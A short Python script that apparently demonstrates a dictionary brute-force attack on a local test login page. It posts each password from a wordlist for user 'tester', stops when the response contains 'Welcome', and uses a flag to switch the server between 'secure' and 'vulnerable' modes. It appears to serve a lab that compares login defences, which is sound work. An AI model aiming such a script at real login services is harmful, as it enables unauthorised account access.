import requests
import time
import sys

if len(sys.argv) > 1:
    mode = sys.argv[1]
else:
    mode = "vulnerable"

if mode == "secure":
    secure_flag = "true"
else:
    secure_flag = "false"

url = "http://127.0.0.1:5000/login"
username = "tester"

start_time = time.time()

with open("passwords.txt", "r") as common_passwords:

    attempt_count = 0

    for pwd in common_passwords:

        password = pwd.strip()
        attempt_count += 1

        data = {
            "username": username,
            "password": password,
            "secure": secure_flag
        }

        resp = requests.post(url, data=data)

        if "Welcome" in resp.text:
            duration = time.time() - start_time
            print(f"\n[+] Password FOUND: {password}")
            print(f"[✓] Attempts: {attempt_count}")
            print(f"[✓] Time taken: {duration:.2f} seconds")
            break
        else:
            print(f"[-] Tried: {password}")